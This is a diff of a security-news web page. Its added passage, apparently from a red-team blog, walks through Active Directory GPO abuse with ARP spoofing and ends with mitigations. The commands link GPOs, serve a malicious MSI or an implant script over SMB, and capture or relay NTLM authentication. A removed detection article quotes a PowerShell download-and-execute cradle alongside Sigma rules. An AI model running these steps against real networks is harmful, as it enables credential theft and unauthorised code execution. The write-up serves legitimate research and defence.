+With SYSVOL cloned, tools like [GPOHound](https://github.com/cogiceo/GPOHound) are excellent for deeper GPO analysis. I professionally vibecoded [parse_sysvol.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/parse_sysvol.py) to produce the specific output needed for these attacks. The script correlates SYSVOL data, GPO settings, and GPO GUIDs with BloodHound data to show affected OUs, users, and computers, while specifically identifying software installations, drive maps, and scripts.
+python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
+Reviewing the output, the SOFTWAREINSTALLS GPO {88D041AF-58E8-47BC-AB13-110B2F438DB2} stands out. It deploys multiple MSIs, including googlechromestandaloneenterprise64.msi, which points to DC02.
+Here are a couple of notes before moving on. The advertised software cannot already be installed on the target, since Group Policy Software Installation/Windows Installer tracks products by ProductCode and will usually skip a package if it believes it is already present. This may behave differently in upgrade or redeployment scenarios. Also, .aas advertisement files appear to persist in SYSVOL even after related software installation has been removed from the GPO, meaning SYSVOL may contain stale entries for software that is no longer being actively requested for deployment.
+In practice, this makes the last-modified timestamp of an .aas a useful heuristic for identifying live deployments, although creating an SMB share with multiple file names would work as well. It is also helpful that the MSI paths referenced here use a direct hostname rather than the domain namespace. Domain-based UNC paths trigger DFS referrals through domain controller infrastructure and make ARP spoofing much more finicky. While spoofing all domain controller IP addresses could still create opportunities to intercept connection attempts, it also prevents the target from reaching any domain controller for authentication, group policy processing, and other domain functions.
+That aside, with our target GPO identified, linking it can be done with [link_gpo.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/link_gpo.py). Other tools may be useful here, such as [GPOwned.py](https://github.com/X-C3LL/GPOwned). Appending to the end of the gPLink string gives our link the highest normal precedence, but further modifications could be made to set our GPO to enforced.
+python3 link_gpo.py -u coby -p Password01 -d woke.local -dc-ip 192.168.100.67 –gpo-guid ‘{88D041AF-58E8-47BC-AB13-110B2F438DB2}’ --target-ou "OU=CoolComputers,DC=woke,DC=local"
+With this link in place, we need to convince the WIN11-WOKE that we are DC02. A basic ARP spoof against DC02’s IP address (192.168.100.69) suffices, causing traffic destined to DC02 to be sent to our attacker host instead. Additionally, I add a secondary IP address to my interface, so the traffic destined to DC02 is not dropped. Then, I use the tool [arpspoof-ng](https://github.com/Coontzy1/arpspoof-ng) to send gratuitous ARP packets.
+ip addr add 192.168.100.69/32 dev ens32
+arpspoof-ng -i ens32 -t 192.168.100.201,192.168.100.224 -s 192.168.100.69
+Then, using [Impacket](https://github.com/fortra/impacket)’s smbserver.py, we stand up an SMB server with the installers share hosting our malicious googlechromestandaloneenterprise64.msi. Our malicious payload is a standalone C# add-user program compiled into an MSI. Then, we patch the Windows Installer so its ProductCode and PackageCode match the values of the real package found in SYSVOL. Failure to do so results in errors such as the one (1) shown below, but the failures may also be operator error.
+smbserver.py installers /root/tmp/installers/ -smb2support --interface-address 192.168.100.69 -debug -ts
+When WIN11-WOKE reaches the Group Policy refresh interval, roughly every 90 minutes, the newly linked GPO becomes visible to the system. However, the software installation itself does not occur until the computer reboots, which means we must be ARP spoofing when that reboot occurs. From a low-user perspective, forcing that reboot may not always be possible. One (1) unique solution for remotely restarting a Windows system without Administrator rights is through RDP when NLA is disabled.
+xfreerdp /v:192.168.100.224 /u:test /p:test /sec:tls /cert:ignore
+Then, once the system is restarted, it retrieves our malicious package, installs it, and adds the local user with Administrator permissions. At that point, we have achieved code execution as SYSTEM stemming from WriteGPLink, given favorable network access and timing.
+This attack is definitely possible, but that is assuming a couple of stars align. You need layer-2 access for ARP spoofing, a viable unlinked policy to apply, and a timely reboot to happen. Even with those caveats, I hope this can stand as another viable method for exploiting WriteGPLink when other AD conditions are not available. And if the OU contains users rather than computers, opportunities still exist within linked logon scripts, or scheduled tasks may come into play.
+Attack 2: Drive Map Spoofing + NTLM Capture and WebDAV Downgrade
+Beyond software installation, GPOs are commonly used to deploy mapped drives through Group Policy Preferences. These Drives.xml configurations contain UNC paths that affect users that will automatically connect during logon or policy processing. Utilizing the [parse_sysvol.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/parse_sysvol.py) script from before, it can be correlated with BloodHound data to enumerate which users have what drives and where they connect to.
+python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
+In this case, these drive mappings all point towards DC02 by hostname. Every time a user logs in, their machine makes a network request to connect to the referenced share. As noted earlier, these paths that are using direct hostnames will make the spoofing setup match easier.
+This approach is also a bit different from broadcast name-resolution poisoning tools like [Responder](https://github.com/lgandx/Responder). While Responder is excellent at what it does, my goal here was to be a bit more surgical. By ARP spoofing a single IP address only to a subset of hosts, the affected machines still resolve DC02 through normal processes and receive the expected address; however, the ARP entry redirects the traffic to the attacker-controlled host instead.
+Then, to perform this attack, I can set up either smbserver.py or ntlmrelayx.py while using [arpspoof-ng](https://github.com/Coontzy1/arpspoof-ng) to target multiple hosts simultaneously. Authentication can be triggered in several ways, such as through user logon, browsing to the mapped drive in Explorer, or reconnection attempts to a persistent drive after a session lock/unlock. When those connections reach the attacker-controlled host, the NTLMv2 authentication can be captured for offline recovering or relayed to a system that does not enforce SMB Signing.
+ip addr add 192.168.100.69/32 dev ens32
+arpspoof-ng -i ens32 -t 192.168.100.201,192.168.100.224,192.168.100.67 -s 192.168.100.69
+ntlmrelayx.py -t smb://<NO_SMB_SIGNING_HOST> -smb2support -socks --interface-ip 192.168.100.69 --keep-relaying -of hashes
+While testing the drive map spoofing attack, I noticed something odd. A stale SMB server was left running between tests, which caused the client to retry the same UNC path over HTTP on port 80 instead of simply failing. This turned out to be Windows WebClient service stepping in as a fallback after SMB connection failed.
+To confirm this was not a fluke, I tested it with a custom SMB server that sent the same garbage error code observed in the packet capture and saw the same result. Then, I repeated the test using smbserver.py configured with authentication that would fail, which produced the same result. After the SMB failure, the client retried over WebDAV and sent NTLM authentication over HTTP. Additionally, the captured hashes confirmed the target SPN was changed to HTTP/DC02.woke.local.
+This method is particularly useful because once the client falls back to WebDAV, the authentication is no longer tied to an SMB session. That makes it far more flexible for NTLM relay attacks to other services such as LDAP, LDAPS, AD CS, and SMB.
+After validating the behavior in the lab, I found that [Syntaktiv documented the same SMB-to-WebDAV fallback](https://www.synacktiv.com/en/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking) in the context of multicast poisoning using Responder. Their work showed that error codes such as STATUS_BAD_NETWORK_NAME and STATUS_LOGON_FAILURE can trigger a retry but confirmed that the trigger list was not exhaustive. Notably, my testing showed that the same behavior also occurs against existing SMB shares while ARP spoofing. Synacktiv also noted that WebClient needed to be installed and running. In my testing, the service started automatically in the background, which aligns with later [SpecterOps research](https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap/). Note that on Windows Server, the WebClient service is not installed by default.
+To demonstrate this attack, I first confirm that the WebClient service is not running on the target workstation with NetExec.
+With arpspoof-ng running in the background to redirect DC02’s IP address to the attack host, I start smbserver.py on port 445 and configured it to require authentication that the client could not satisfy. Responder can also be used with the -E option. Then, I also start ntlmrelayx.py, listening on port 80, to capture and relay the HTTP NTLM authentication. When the user logs in and Group Policy processes the mapped drive, the workstation sends the authentication to the attack host on SMB, which fails. Then, the NTLM authentication arrives over HTTP, where ntlmrelayx.py relays it to LDAP.
+smbserver.py share . -smb2support -debug -ts --interface-address 192.168.100.69 -username test -password test
+ntlmrelayx.py -t ldap://192.168.100.67 -socks -smb2support -ip 192.168.100.69 --no-smb-server --keep-relaying -of hashes.txt
+Lastly, I first confirm that the WebClient service is now running on the target workstation after exploitation.
+Attack 3: Logon Script Spoofing for Code Execution
+Now that we’ve covered some other approaches to GPO-based abuse, it is worth looking at logon scripts directly. When a GPO assigns a logon script, the Group Policy client retrieves the referenced script from the UNC path, typically something under SYSVOL or NETLOGON, and executes it under the user’s security context. Startup scripts follow the same model, except they run as SYSTEM during startup before any user logs on. These scripts are often used to map drive or copy files, but they may also launch executables or PowerShell scripts hosted somewhere else on the network. If either the script itself or a downstream resource is referenced by a spoofable hostname, that reference becomes an opportunity for this attack.
+Running [parse_sysvol.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/parse_sysvol.py) against our cloned SYSVOL again, we enumerate the following configurations.
+python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
+As the output shows, multiple users are in the MAPPEDDRIVES OU that will fetch Logon.bat from SYSVOL on every sign-in. If we inspect this Logon.bat—which in our case we have cloned, since it resided in SYSVOL—it references a PowerShell script hosted on a different server.
+In the lab environment, FILESERVER01 resolves to 192.168.100.226. The next step is to use arpspoof-ng to target the two (2) Windows hosts that will later attempt to process the script.
+ip addr add 192.168.100.226/32 dev ens32
+arpspoof-ng -i ens32 -t 192.168.100.201,192.168.100.224 -s 192.168.100.226
+Next, smbserver.py is set up to host a malicious Update-Monitor.ps1, our [Badrats](https://gitlab.com/KevinJClark/badrats) implant. When that script executes, the target host should call back to the Badrats server. At that point, the stage is set and we must wait until a user logs in.
+smbserver.py tools . -smb2support -debug -ts --interface-address 192.168.100.226
+Once that happens, the Group Policy client pulls the normal Logon.bat from the domain controller and processes it normally until it reaches the \\FILESERVER01\tools\Update-Monitor.ps1 reference. That request is redirected to our SMB server, the malicious script is retrieved, and a moment later, the user checks into our C2 server.
+Python3 badrats_server.py
+Beyond These Attacks
+The three (3) attacks in this post are strong, concrete examples, but they are not an exhaustive list. They reflect a broader pattern in how Group Policy and workstations interact across the network, while also reinforcing how dangerous it is to lack layer-2 protections.
+Logoff and shutdown scripts mirror their logon and startup counterparts, just with different triggers. GPP Files, Folders, and Folder Redirection apply the same idea with file placement and file retrieval paths. Scheduled Tasks can trigger execution at known intervals, although the files they reference are often local rather than remote. With enough situational awareness, a generic GPO mechanism can become a highly targeted opportunity.
+More importantly, WriteGPLink is only one (1) way to reach the same outcome. Permissions like AddMember or AllExtendedRights on an OU can let you place a privileged principal inside it, causing it to process an already linked, vulnerable GPO. The same applies if you can create, link, or edit a GPO directly. The problem compounds further if resources referenced in SYSVOL can be modified because of misconfigurations, or if lax permissions exist on referenced network shares. In those cases, there is no need to redirect traffic at all.
+Mitigations
+- Enforce SMB Signing and LDAP protections. Require SMB Signing where possible, and enable LDAP signing and channel binding where supported. This breaks several of the relay paths discussed above.
+- Audit AD ACLs regularly. Review permissions on users, OUs, and groups for rights such as WriteGPLink, AddMember, WriteOwner, and other related control paths.
+- Harden layer-2 protections. Enable controls such as Dynamic ARP Inspection and related protections that make ARP spoofing substantially harder.
+- Audit GPO and GPP references on network resources. Review logon scripts, startup scripts, drive mappings, and other configurations that may be used in a more strategic attack.
+- Tighten permissions on file shares. Ensure only the intended administrators and management systems can modify scripts, binaries, and installers referenced by GPOs.
+Conclusion
+Hopefully, some of these ideas are useful in your own offensive or defensive security work. DFS-backed UNC path spoofing may prove to be a stronger approach for some of these attacks. If you have found a feasible way to make this work, feel free to reach out. If you enjoyed the post, follow me on X/Twitter [@Coontzy1](https://x.com/Coontzy1) for constant reposts and no original thought.
+Shoutouts
+Larry Spohn - Blog Peer Review
+TrustedSec QA Team - Quality assurance and editing
+Tools
+[arpspoof-ng](https://github.com/Coontzy1/arpspoof-ng)[badrats](https://gitlab.com/KevinJClark/badrats)[BloodHound](https://github.com/specterops/bloodhound)[dsniff (arpspoof)](https://github.com/tecknicaltom/dsniff)[GPOHound](https://github.com/cogiceo/GPOHound)[GPOwned](https://github.com/X-C3LL/GPOwned)[Impacket](https://github.com/fortra/impacket)[link_gpo.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/link_gpo.py)[NetExec](https://github.com/Pennyw0rth/NetExec)[parse_sysvol.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/parse_sysvol.py)[Responder](https://github.com/lgandx/Responder)
+References
+[https://labs.withsecure.com/publications/ou-having-a-laugh](https://labs.withsecure.com/publications/ou-having-a-laugh)[https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/support-for-unc-naming-and-mup](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/support-for-unc-naming-and-mup)[https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-processing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-processing)[https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap/](https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap/)[https://wald0.com/?p=179](https://wald0.com/?p=179)[https://www.synacktiv.com/en/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking](https://www.synacktiv.com/en/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking)[https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
             <h2 class="article-title">CISA Adds Actively Exploited ConnectWise and Windows Flaws to KEV</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cisa-adds-actively-exploited.html" target="_blank">Original Link</a></p>
             <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday [added](https://www.cisa.gov/news-events/alerts/2026/04/28/cisa-adds-two-known-exploited-vulnerabilities-catalog) two security flaws impacting ConnectWise ScreenConnect and Microsoft Windows to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, based on evidence of active exploitation.
@@ -152,7 +263,7 @@ It's worth noting that CISA [added](https://thehackernews.com/2024/02/critical-f
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
+        <div id="art-5" class="article-body">
             <h2 class="article-title">CISA Adds Two Known Exploited Vulnerabilities to Catalog</h2>
             <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/04/28/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
             <div class="content-text">CISA Adds Two Known Exploited Vulnerabilities to Catalog
@@ -166,7 +277,7 @@ This product is provided subject to this [Notification](/notification) and this 
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-4" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">CISA Adds 4 Exploited Flaws to KEV, Sets May 2026 Federal Deadline</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cisa-adds-4-exploited-flaws-to-kev-sets.html" target="_blank">Original Link</a></p>
             <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday [added](https://www.cisa.gov/news-events/alerts/2026/04/24/cisa-adds-four-known-exploited-vulnerabilities-catalog) four vulnerabilities impacting SimpleHelp, Samsung MagicINFO 9 Server, and D-Link DIR-823X series routers to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
@@ -180,7 +291,7 @@ To mitigate the active threats, Federal Civilian Executive Branch (FCEB) agencie
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-5" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">Patch Tuesday, April 2026 Edition</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/patch-tuesday-april-2026-edition/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft today pushed software updates to fix a staggering 167 security vulnerabilities in its Windows operating systems and related software, including a SharePoint Server zero-day and a publicly disclosed weakness in Windows Defender dubbed “BlueHammer.” Separately, Google Chrome fixed its fourth zero-day of 2026, and an emergency update for Adobe Reader nixes an actively exploited flaw that can lead to remote code execution.
@@ -235,241 +346,7 @@ Great article! The flow of the article really helps the message land. Keep them 
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Building a Detection Foundation: Part 5 - Correlation in Practice</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/building-a-detection-foundation-part-5-correlation-in-practice" target="_blank">Original Link</a></p>
-            <div class="content-text">Building a Detection Foundation: Part 5 - Correlation in Practice
-Table of contents
-From Data Sources to Detection
-We've covered a lot of ground in this series: Windows Security events for logon tracking and process execution; PowerShell logging for script visibility; Sysmon for network connections; registry changes; and everything native logging misses.
-But having logs isn't the same as using them effectively. In this final part, I want to walk through how these data sources work together—in detection engineering and Incident Response.
-As can be gleaned from the previous posts in this series, to get the most out of the logs, a SIEM solution where logs are shipped to is a must. Local logs have proven invaluable, but they are at the mercy of the attacker.
-The Correlation Model
-At the heart of Windows forensics and detection is a simple concept: every action happens in a context. That context is defined by:
-- Who: The user account and session
-- What: The process, command, or action
-- When: The timestamp
-- Where: The system, and potentially the source system for remote activity
-- How: The parent process, the logon type, the network path
-Our logging foundation captures each of these elements across multiple event sources. The art is correlating them.
-The LogonID Thread
-I've mentioned LogonID repeatedly throughout this series because it's the key correlation point in Windows. Let me show you how it ties everything together.
-When a user logs on (Event 4624), they receive a LogonID. That same LogonID appears in:
-- Event 4688 / Sysmon Event 1: Process creation by that session
-- Events 4656, 4663: Object access by that session
-- Event 4672: Special privileges for that session
-- PowerShell 4103, 4104: Script execution by that session
-- Sysmon Event 3: Network connections by processes in that session
-This means you can take any suspicious event and trace it back to:
-- The session it belongs to
-- All other activity within that session
-- The authentication event that created the session
-A Real Investigation Flow
-Let me walk through a realistic scenario that demonstrates this correlation.
-Initial Alert: Your SIEM detects a suspicious PowerShell script block (Event 4104):
-Event ID: 4104
-TimeCreated: 2024-03-15 14:23:45
-ScriptBlockText:
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$wc = New-Object System.Net.WebClient
-$wc.DownloadString("https://192.168.100.50/beacon.ps1") | IEX
-This is a download cradle with certificate validation bypass. Clearly malicious. Now what?
-Step 1: Identify the session
-Look at the same event's metadata to get the user context and Security ID.
-Step 2: Find the process context (Sysmon Event 1)
-Query for powershell.exe process creation around the same time:
-Now you know:
-- PowerShell was spawned by cmd. exe
-- Execution policy was bypassed
-- Window was hidden
-- User was CORP\jsmith
-- LogonID is 0x7A8B4
-Step 3: Trace the parent chain
-What spawned cmd. exe? Query Sysmon Event 1 for that process ID:
-Outlook spawned the command prompt. This is likely a phishing email with a malicious attachment or link.
-Step 4: Check network connections (Sysmon Event 3)
-Did PowerShell actually connect to that IP address?
-Event ID: 3 (Sysmon)
-TimeCreated: 2024-03-15 14:23:46
-Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-DestinationIp: 192.168.100.50
-DestinationPort: 443
-Protocol: tcp
-User: CORP\jsmith
-Confirmed. PowerShell connected to the C2 server.
-Step 5: Look for follow-up activity
-Using the LogonID, search for all subsequent events in that session:
-- Additional process creation (Event 4688, Sysmon 1)
-- File creation (Sysmon Event 11)
-- Registry modifications (Sysmon Events 12, 13)
-- More network connections (Sysmon Event 3)
-- LSASS access (Sysmon Event 10)
-Step 6: Identify the initial AP (Event 4624)
-Event ID: 4624
-TimeCreated: 2024-03-15 08:15:22
-TargetUserName: jsmith
-LogonType: 2
-WorkstationName: WORKSTATION01
-LogonId: 0x7A8B4
-The user logged on interactively at 8:15AM. The malicious activity started at 2:23PM. The attacker likely had to wait for the user to interact with the phishing email.
-Step 7: Scope the damage
-With the session bounded by logon (4624) and logoff (4634), you can identify everything that happened:
-- Files created or modified
-- Registry changes
-- Lateral movement attempts
-- Data staged for exfiltration
-Building Detections That Use Correlation
-Detection engineering benefits from correlation too. Instead of alerting on individual events, you can build detections that require multiple corroborating signals.
-Example 1: LSASS Access From Suspicious Parent
-Logic: Alert when a process accesses LSASS (Sysmon Event 10) AND the parent process is unusual
-# Pseudocode detection logic
-correlation:
-- sysmon_event_10:
-TargetImage: "lsass.exe"
-GrantedAccess:
-- "0x1010"
-- "0x1FFFFF"
-- sysmon_event_1:
-ProcessId: $source_process_id
-ParentImage: not in [
-"MsMpEng.exe",
-"csrss.exe",
-"services.exe"
-]
-Example 2: Download and Execute Pattern
-Logic: Alert when you see a network connection (Sysmon Event 3) followed by a new process creation (Sysmon Event 1) from a script interpreter within a short time window
-# Pseudocode
-correlation:
-- sysmon_event_3:
-Image: contains ["powershell", "wscript", "cscript", "mshta"]
-DestinationIsIpv6: false
-- within 30 seconds:
-- sysmon_event_1:
-ParentImage: same as above
-Image: not in [legitimate_children]
-Example 3: Persistence Followed by Execution
-Logic: Alert when a registry run key is created (Sysmon Event 13) and then a process starts from that path
-# Pseudocode
-correlation:
-- sysmon_event_13:
-TargetObject: contains "CurrentVersion\Run"
-Details: capture as $executable_path
-- within 1 hour:
-- sysmon_event_1:
-Image: equals $executable_path
-Practical Detection Examples
-Let me provide some concrete Sigma-style detection rules that leverage our logging foundation. I like [Sigma](https://github.com/SigmaHQ/sigma) rules because they can be used with most SIEMs.
-Encoded PowerShell Execution
-title: Encoded PowerShell Command Execution
-status: stable
-logsource:
-product: windows
-category: process_creation
-detection:
-selection_process:
-Image|endswith: '\powershell.exe'
-selection_encoded:
-CommandLine|contains:
-- ' -enc '
-- ' -encodedcommand '
-- ' -ec '
-condition: selection_process and selection_encoded
-level: medium
-LSASS Memory Access
-title: LSASS Memory Access by Suspicious Process
-status: stable
-logsource:
-product: windows
-category: sysmon
-service: sysmon
-detection:
-selection:
-EventID: 10
-TargetImage|endswith: '\lsass.exe'
-GrantedAccess:
-- '0x1010'
-- '0x1410'
-- '0x1FFFFF'
-filter_legitimate:
-SourceImage|contains:
-- '\MsMpEng.exe'
-- '\vmtoolsd.exe'
-- '\csrss.exe'
-condition: selection and not filter_legitimate
-level: high
-Remote PowerShell Execution (WinRM)
-New Service Installation
-title: Suspicious Service Installation
-status: stable
-logsource:
-product: windows
-service: security
-detection:
-selection:
-EventID: 4697
-filter_legitimate:
-ServiceFileName|contains:
-- '\Windows\'
-- '\Program Files\'
-condition: selection and not filter_legitimate
-level: high
-Building a Correlation Playbook
-When responding to incidents, having a systematic approach helps. Here's a playbook structure:
-For Any Suspicious Process:
-1. Get process details (Sysmon Event 1)
-- Image, CommandLine, Hashes
-- Parent process chain
-2. Check network activity (Sysmon Event 3)
-- Did this process make external connections?
-3. Check file operations (Sysmon Event 11)
-- Did this process create files?
-4. Check registry operations (Sysmon Events 12, 13, 14)
-- Did this process establish persistence?
-5. Identify the session (LogonID → Event 4624)
-- Who was logged on?
-- From where?
-6. Scope all session activity
-- What else happened in this session?
-For Lateral Movement Investigation:
-1. Identify network logons (Event 4624, LogonTypes 3, 10)
-- From which source IP addresses?
-- Which accounts?
-2. Trace the source
-- Look for the same account on the source system
-- What initiated the connection?
-3. Check for credential material
-- LSASS access on source (Sysmon Event 10)
-- Kerberos ticket requests (Events 4768, 4769)
-The Value of Redundancy
-Throughout this series, I've emphasized layered telemetry, sometimes a bit too much? Let me give you one final example of why this all matters.
-Scenario: An attacker uses a signed, living-off-the-land (LOTL) binary to execute malicious code.
-What EDR might show: Possibly nothing—the binary is signed and commonly used.
-What you'll see with our foundation:
-Event Source | What It Captures |
-|---|---|
-Event 4624 | Initial logon session |
-Event 4688 | mshta.exe execution with URL parameter |
-Sysmon Event 1 | Same, plus hash, parent process |
-Sysmon Event 3 | Network connection to malicious URL |
-PowerShell 4104 | If PowerShell was spawned, full script content |
-Sysmon Event 11 | Any payloads written to disk |
-Sysmon Event 13 | Persistence mechanisms created |
-Even if your EDR is blind, you have the full story.
-Final Thoughts
-Building a detection foundation isn't a one-time project. It's a capability that requires ongoing attention:
-- Tune your configurations as you learn what's noisy and what's valuable.
-- Test your visibility by running adversary simulations.
-- Practice correlation before you need it in a real incident.
-- Document your environment so you know what's logging and what isn't.
-The ultimate goal we've worked toward in this series is resilience. When (not if) your primary security tool misses something, you want to have the data to detect and investigate independently.
-The techniques we've covered—native Windows auditing, PowerShell logging, and Sysmon—are proven, operationally tested, and free. They require effort to implement well, but that effort pays dividends every time you use them to answer the question: "What exactly happened here?"
-If you need help with this effort, [get in touch with us](https://trustedsec.com/contact)! We have a great Purple Team that can assist in planning and building your detection foundation.
-I may tackle the same approach for Linux ... 🤔</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</h2>
             <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain/" target="_blank">Original Link</a></p>
             <div class="content-text">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors
@@ -980,44 +857,6 @@ $ = "src/MigFilterBypassThread.js"
 condition:
 any of them
 }</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-8" class="article-body">
-            <h2 class="article-title">Microsoft Patch Tuesday, March 2026 Edition</h2>
-            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/03/microsoft-patch-tuesday-march-2026-edition/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft Corp. today pushed security updates to fix at least 77 vulnerabilities in its Windows operating systems and other software. There are no pressing “zero-day” flaws this month (compared to February’s five zero-day treat), but as usual some patches may deserve more rapid attention from organizations using Windows. Here are a few highlights from this month’s Patch Tuesday.
-Two of the bugs Microsoft patched today were publicly disclosed previously. [CVE-2026-21262](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21262) is a weakness that allows an attacker to elevate their privileges on SQL Server 2016 and later editions.
-“This isn’t just any elevation of privilege vulnerability, either; the advisory notes that an authorized attacker can elevate privileges to sysadmin over a network,” Rapid7’s Adam Barnett said. “The CVSS v3 base score of 8.8 is just below the threshold for critical severity, since low-level privileges are required. It would be a courageous defender who shrugged and deferred the patches for this one.”
-The other publicly disclosed flaw is [CVE-2026-26127](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26127), a vulnerability in applications running on .NET. Barnett said the immediate impact of exploitation is likely limited to denial of service by triggering a crash, with the potential for other types of attacks during a service reboot.
-It would hardly be a proper Patch Tuesday without at least one critical Microsoft Office exploit, and this month doesn’t disappoint. [CVE-2026-26113](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26113) and [CVE-2026-26110](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26110) are both remote code execution flaws that can be triggered just by viewing a booby-trapped message in the Preview Pane.
-Satnam Narang at Tenable notes that just over half (55%) of all Patch Tuesday CVEs this month are privilege escalation bugs, and of those, a half dozen were rated “exploitation more likely” — across Windows Graphics Component, Windows Accessibility Infrastructure, Windows Kernel, Windows SMB Server and Winlogon. These include:
-–[CVE-2026-24291](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24291): Incorrect permission assignments within the Windows Accessibility Infrastructure to reach SYSTEM (CVSS 7.8)
-–[CVE-2026-24294](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24294): Improper authentication in the core SMB component (CVSS 7.8)
-–[CVE-2026-24289](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24289): High-severity memory corruption and race condition flaw (CVSS 7.8)
-–[CVE-2026-25187](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-25187): Winlogon process weakness discovered by Google Project Zero (CVSS 7.8).
-Ben McCarthy, lead cyber security engineer at Immersive, called attention to [CVE-2026-21536](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21536), a critical remote code execution bug in a component called the Microsoft Devices Pricing Program. Microsoft has already resolved the issue on their end, and fixing it requires no action on the part of Windows users. But McCarthy says it’s notable as one of the first vulnerabilities identified by an AI agent and officially recognized with a CVE attributed to the Windows operating system. It was discovered by XBOW, a fully autonomous AI penetration testing agent.
-XBOW has consistently ranked at or near the top of the Hacker One bug bounty leaderboard for the past year. McCarthy said CVE-2026-21536 demonstrates how AI agents can identify critical 9.8-rated vulnerabilities without access to source code.
-“Although Microsoft has already patched and mitigated the vulnerability, it highlights a shift toward AI-driven discovery of complex vulnerabilities at increasing speed,” McCarthy said. “This development suggests AI-assisted vulnerability research will play a growing role in the security landscape.”
-Microsoft earlier provided patches to address nine browser vulnerabilities, which are not included in the Patch Tuesday count above. In addition, Microsoft issued a crucial out-of-band (emergency) [update on March 2](https://support.microsoft.com/en-us/topic/march-2-2026-kb5082314-os-build-20348-4776-out-of-band-606518e5-28d2-4ebe-be25-26287e2fc703) for Windows Server 2022 to address a certificate renewal issue with passwordless authentication technology Windows Hello for Business.
-Separately, Adobe shipped updates to fix 80 vulnerabilities — some of them critical in severity — in [a variety of products](https://helpx.adobe.com/security/Home.html), including Acrobat and Adobe Commerce. Mozilla Firefox v. 148.0.2 resolves three high severity CVEs.
